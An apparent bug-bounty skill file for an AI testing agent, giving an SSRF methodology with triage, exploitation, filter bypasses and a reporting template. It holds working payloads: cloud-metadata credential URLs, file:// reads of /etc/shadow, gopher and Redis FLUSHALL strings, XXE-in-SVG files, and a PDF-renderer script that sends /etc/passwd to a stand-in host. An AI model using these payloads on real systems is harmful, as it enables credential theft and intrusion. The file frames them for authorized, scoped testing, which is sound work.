---
name: ssrf
description: Server-Side Request Forgery. Use when HauntMode flags SSRF as APPLIES/MAYBE, when a request contains a URL/hostname/IP/path parameter that the server might fetch, when testing webhooks/import-by-URL/PDF generators/image fetchers/integrations, or when you need an end-to-end methodology with filter bypasses, OOB detection, cloud metadata probing, and protocol attacks.
---

# SSRF — Server-Side Request Forgery

This skill covers detection, confirmation, exploitation, filter bypass, and post-exploitation chaining for all SSRF variants (reflected, blind, chained, cloud-context).

---

## 1. Triggers — when this skill applies

- Any parameter that accepts a URL, hostname, IP address, or file path that the server might fetch
- Webhooks — "callback URL", "notify URL", "ping URL"
- Import/upload by URL — "import from URL", "fetch avatar", "add feed"
- PDF generators — wkhtmltopdf, Puppeteer, headless Chrome rendering HTML you supply
- Image/asset fetchers — thumbnail generators, screenshot tools, proxy services
- SSO/OAuth callback URL fields
- Integration configuration — "Slack webhook", "Jira endpoint", "custom API URL"
- Any parameter named: `url`, `uri`, `src`, `dest`, `redirect`, `to`, `path`, `load`, `fetch`, `q`, `resource`, `target`, `host`, `api`, `endpoint`, `callback`, `dateserver`
- `Referer` header that the server re-fetches
- XML/SOAP `<import>`, `<include>`, `<load>` elements
- **SVG upload with server-side rendering:** Any feature that accepts SVG files and converts them server-side (to PNG, thumbnail, preview) — the server parses the SVG XML, triggering XXE. External entity references (`file://`, `http://`) are resolved by the SVG renderer, enabling LFI and SSRF with the exfiltrated data rendered into the output image.
- **Host header in OAuth callback construction:** If an OAuth integration endpoint uses the incoming `Host` header to build the callback URL before making a server-side request (e.g., `POST /-/jira/login/oauth/access_token`), setting `Host: internal.target.com:PORT` causes the server to send the OAuth token request to an internal address.
- Any server error that includes an internal IP, internal hostname, or fetch-related stack trace
- **Project/data import features:** When an app imports JSON/XML export files and processes model attributes, check if file attachment fields accept a remote URL instead of a file path. Any `remote_*_url` or equivalent "download from URL" attribute on an importable model triggers a server-side fetch on import.

---

---

## 3. 30-second triage

Drop these in any URL-accepting parameter. Set up a netcat listener or use the ezXSS OOB domain to detect callbacks:

```
# Check for OOB callback (blind detection)
YOUR_EZXSS_DOMAIN/ssrf-test

# Check for reflected SSRF (non-blind)
http://127.0.0.1/
http://127.0.0.1:80/

# Check if file:// is supported
file:///etc/passwd
```

Observe:
- Did you get a callback to your OOB domain? → Blind SSRF confirmed
- Does the response contain content from the internal target? → Non-blind SSRF confirmed
- Does the response change (timing, size, error message) vs a non-existent host? → SSRF likely

**Skip deep dive if:**
- Parameter is strictly validated (UUID, email format) AND Burp tampering confirms no server-side fetch occurs
- The parameter is only used for client-side redirects (302 to Location header) — that's an open redirect, not SSRF

---

## 4. Pre-flight setup

Per `~/bugbounty/CLAUDE.md`:
- **OOB callback domain:** `YOUR_EZXSS_DOMAIN` (ezXSS). Append identifier: `YOUR_EZXSS_DOMAIN/ssrf-param-name`
- **Local listener for non-HTTPS targets:** `nc -nvlp 8080`
- **Rate limits:** Re-read `program-guidelines.txt` before port-scanning via SSRF — high request volumes trip rate limits fast
- **Scope:** Confirm internal IPs/hostnames discovered via SSRF are not out-of-scope third-party systems

---

## 5. Detection — confirming SSRF

### 5.1 Non-blind (reflected) SSRF

Point the parameter at your own listener. If the server connects back, it's confirmed:

```bash
# Terminal 1 — listener
nc -nvlp 8080

# Terminal 2 — trigger
curl -i -s "https://target.tld/load?q=http://YOUR_VPN_IP:8080"
```

Then point it at itself to confirm the response is reflected:
```
http://127.0.0.1/
http://127.0.0.1/index.php
```

### 5.2 Blind SSRF

Use OOB callback:
```
YOUR_EZXSS_DOMAIN/ssrf-fieldname
```

Also test with a non-existent domain and a known-live domain to establish baseline response differences.

### 5.3 Infer blind SSRF from error messages

Different error messages for open vs closed ports, or existing vs non-existing files, confirm SSRF even without OOB:
- "Connection refused" = port closed
- "Connection timed out" = filtered
- Different response body/size = something happened server-side

---

## 6. Exploitation — what to do after confirming SSRF

### 6.1 Port scan internal services

```bash
# Generate port list
seq 1 10000 > ports.txt

# Fuzz — filter on error message for closed ports (adjust -fr to match what closed port returns)
[RUN THIS]
ffuf -w ./ports.txt:PORT -u "https://target.tld/load?q=http://127.0.0.1:PORT" -fr "Connection refused" -fs <closed_port_size>
```

### 6.2 Cloud metadata endpoints

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Note: GCP requires header `Metadata-Flavor: Google`

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Note: Azure requires header `Metadata: true`

**Generic internal ranges to probe:**
```
http://127.0.0.1/
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

### 6.3 Read local files via file:// scheme

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///app/config.py
file:///var/www/html/config.php
```

Check supported schemes from User-Agent (e.g., `Python-urllib/3.8` supports `file`, `http`, `ftp`).

### 6.4 FTP scheme (if Python urllib or similar)

```
ftp://YOUR_IP/file.txt
```

### 6.5 Gopher protocol — send POST requests internally

Gopher lets you craft arbitrary TCP bytes, enabling POST requests to internal services. Useful when the internal endpoint requires POST (e.g., admin login form):

```
# Manual gopher URL for POST /admin.php with adminpw=admin
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Double-URL-encode the entire gopher URL before embedding it in the outer POST parameter.

Use Gopherus to auto-generate gopher URLs for MySQL, PostgreSQL, Redis, SMTP, FastCGI:
```bash
[RUN THIS]
python2.7 /opt/gopherus/gopherus.py --exploit smtp
```

### 6.6 Chained SSRF (SSRF to pivot deeper)

If the intermediate server also has SSRF, chain the requests:
```
http://TARGET/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=id
```

Note the `http::////` trick to bypass `://` stripping filters.

When executing commands with arguments through chained SSRF (3 layers of URL encoding needed):
```bash
ecmd=$(echo -n "id;hostname" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
curl -s "http://TARGET/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
```

### 6.7 SSRF/LFI via SVG upload with server-side rendering

Any feature that accepts SVG and converts it server-side (image resize, thumbnail, preview, emblem/badge generation) parses the SVG XML. If the renderer supports external entities, XXE triggers LFI and SSRF. The exfiltrated content renders visibly into the output image.

**Payload — file read via XXE in SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Payload — SSRF via SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Upload with `.svg` extension (or try `.svg` disguised as image if extension is filtered). The server renders the SVG to a PNG — if the entity resolved, the file/HTTP response content appears as text in the output image. Download the rendered image and read the text.

**Also try:** `php://filter/convert.base64-encode/resource=/etc/passwd` as the SYSTEM path if the renderer runs PHP.

### 6.9 Blind SSRF via PDF/HTML rendering (wkhtmltopdf)

If the app generates PDFs with user-supplied HTML, try:

```html
<html><body><script>
var readfile = new XMLHttpRequest();
var exfil = new XMLHttpRequest();
readfile.open("GET","file:///etc/passwd", true);
readfile.send();
readfile.onload = function() {
    if (readfile.readyState === 4) {
        var url = 'http://YOUR_IP:PORT/?data='+btoa(this.response);
        exfil.open("GET", url, true);
        exfil.send();
    }
}
</script></body></html>
```

Start listener: `nc -lvnp PORT` and base64-decode the received data.

---

## 7. Filter bypass techniques

### 7.1 Localhost / 127.0.0.1 obfuscation

When `localhost` and `127.0.0.1` are blacklisted by string match:

| Representation | Value |
|---|---|
| Shortened IP | `127.1` |
| Prolonged IP | `127.000000000000000.1` |
| All zeroes | `0.0.0.0` |
| Shortened zeroes | `0` |
| Decimal | `2130706433` |
| Octal | `0177.0000.0000.0001` |
| Hex | `0x7f000001` |
| IPv6 loopback | `::1` or `0:0:0:0:0:0:0:1` |
| IPv4-mapped IPv6 | `::ffff:127.0.0.1` |
| Entire localhost block | `127.x.x.x` (any address in 127.0.0.0/8) |

### 7.2 Bypass via DNS resolution (domain pointing to internal IP)

Use `localtest.me` (resolves to 127.0.0.1) or register your own domain:
```
http://localtest.me/debug
http://localtest.me:PORT/path
```

Filters that only check blacklisted strings (not the resolved IP) fall to this.

### 7.3 Bypass via HTTP redirect

If the filter resolves the domain but doesn't follow redirects, host a redirect script:

```php
<?php header('Location: http://127.0.0.1/debug'); ?>
```

Host it: `php -S 0.0.0.0:80` and point SSRF param at your server.

### 7.4 DNS rebinding (bypass resolve-then-check filters)

When the filter resolves the domain and checks the IP, but there's a race between the check and the actual fetch:

1. Set up domain at `https://lock.cmpxchg8b.com/rebinder.html`: A=`1.1.1.1`, B=`127.0.0.1` → get `01010101.7f000001.rbndr.us`
2. Or run your own rogue DNS (required for air-gapped targets):

```bash
[RUN THIS]
sudo python3 dnsrebinder.py \
  --domain attacker.htb \
  --ip 1.1.1.1 \
  --rebind 127.0.0.1 \
  --counter 1 \
  --tcp --udp
```

First resolution returns `1.1.1.1` (passes filter). Second resolution returns `127.0.0.1` (actual fetch hits internal target).

If target has no internet access, update its DNS config via any admin panel (Webmin, PiHole, etc.) to point at your rogue DNS server first.

### 7.5 `://` stripping bypass

If the app strips `://`:
```
http::////127.0.0.1:5000/
```

### 7.6 Protocol switching

Try alternative schemes when `http://` is the only one checked:
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
ftp://YOUR_IP/file
```

---

## 8. False-positive checks

Do not report SSRF without confirming server-side fetch:

- **Open redirect only** — if the server returns a 302 Location header to an attacker URL but doesn't fetch it server-side, that's an open redirect, not SSRF. Confirm by checking whether a listener on your IP receives a connection.
- **Client-side fetch only** — JavaScript `fetch()` in the browser hitting an external URL is not SSRF. Look for the connection in your listener, not in browser DevTools network tab.
- **DNS-only callback** — a DNS lookup without an HTTP connection is still SSRF but significantly lower impact. Note this carefully in the report.
- **SSRF to out-of-scope third party** — flag but don't probe the third party (OAuth provider, payment processor, etc.).
- **Internal IP disclosed in error, not fetched** — if the server returns an error mentioning `169.254.169.254` or `10.x.x.x` but the server isn't actually making the request, that's information disclosure, not SSRF.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| SSRF to cloud metadata (AWS IAM creds) | `iam-escalation` | Account takeover of cloud environment |
| SSRF to internal admin panel | `idor`, `auth-bypass` | Admin access without auth |
| SSRF to internal service with CMDi | `cmdi` | RCE via chained vulnerabilities |
| SSRF to Redis/Memcached | (direct) | Cache poisoning, session forgery |
| SSRF to SMTP (gopher) | (direct) | Internal email relay, phishing |
| Blind SSRF via PDF generator | `lfi` (file:// read), `xss` (if JS executes) | File read / RCE |
| SSRF to internal SQLi endpoint | `sqli` | Data exfiltration |
| SSRF chained to second SSRF | (this skill) | Deeper internal pivot |
| SSRF confirming internal host → port scan → open service | `cmdi`, `sqli` | Depends on service |

---

## 10. Reporting template

```
POTENTIAL FINDING: Server-Side Request Forgery
Target: <full URL of vulnerable endpoint>
Parameter: <param name + location: query/body/header>
Type: <reflected | blind | via-redirect | DNS-rebinding>
Schemes tested: <http / file / gopher / ftp / dict>
Blind confirmation method: <OOB callback to YOUR_EZXSS_DOMAIN/ssrf-X | listener | timing | error message diff>
Working payload:
    <exact URL/value that triggered the SSRF>
Evidence:
    <NC listener output showing connection from target IP / OOB callback timestamp / response body contents>
Internal services reachable:
    <list of IPs/ports/services confirmed accessible>
Cloud metadata accessible: <yes — endpoint: X | no>
File read confirmed: <yes — /etc/passwd accessible | no>
Impact:
    <e.g. "Cloud metadata at 169.254.169.254 accessible — IAM role credentials retrievable" OR
     "Internal admin panel at 127.0.0.1:8080 accessible via SSRF, no auth required" OR
     "Blind SSRF confirmed via OOB DNS — internal network topology enumerable">
Chain potential: <list other skills/findings combined>
Next step: <e.g. "Enumerate IAM roles at /latest/meta-data/iam/security-credentials/" OR
            "Confirm gopher POST to internal /admin can bypass auth" OR
            "Port scan 10.0.0.0/24 for additional internal services">
```

---

## 11. Recon tracker vector strings

Only log if the user explicitly authorizes (see CLAUDE.md "CRITICAL RULE"):

- `ssrf:reflected:<param>` — confirmed non-blind SSRF in named param
- `ssrf:blind-oob:<param>` — OOB callback received from named param
- `ssrf:blind-inferred:<param>` — inferred from error/timing difference
- `ssrf:cloud-metadata:<provider>` — cloud metadata endpoint accessible
- `ssrf:file-read` — file:// scheme confirmed
- `ssrf:gopher:<service>` — gopher protocol to named internal service
- `ssrf:internal-port:<ip>:<port>` — confirmed internal port reachable
- `ssrf:filter-bypass:<technique>` — non-trivial bypass was required
- `ssrf:no:<param>` — confirmed not vulnerable
- `ssrf:chain:<other-vuln>` — SSRF used to reach another vuln class

---

## 12. What NOT to do

- **Do not attempt to reach cloud metadata on targets not hosted in cloud.** Confirm cloud context from response headers, error messages, or known target info before trying 169.254.169.254.
- **Do not run high-volume port scans via SSRF without rate-limit check.** Re-read `program-guidelines.txt` first. Port scanning via SSRF can easily trigger alerts or bans.
- **Do not probe out-of-scope third-party systems.** If SSRF reaches an OAuth provider, payment processor, or partner API, flag it but do not send any requests to that third party.
- **Do not exfiltrate real user data or credentials** beyond what's needed to prove the vulnerability. Proving IAM access with one metadata call is sufficient.
- **Do not use destructive gopher payloads** (FLUSHALL on Redis, DROP DATABASE via MySQL gopher) on production systems. Use read-only probes.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not assume DNS-only callback = no impact.** Note it accurately — DNS-only means SSRF is present but exfiltration of response body is unconfirmed.
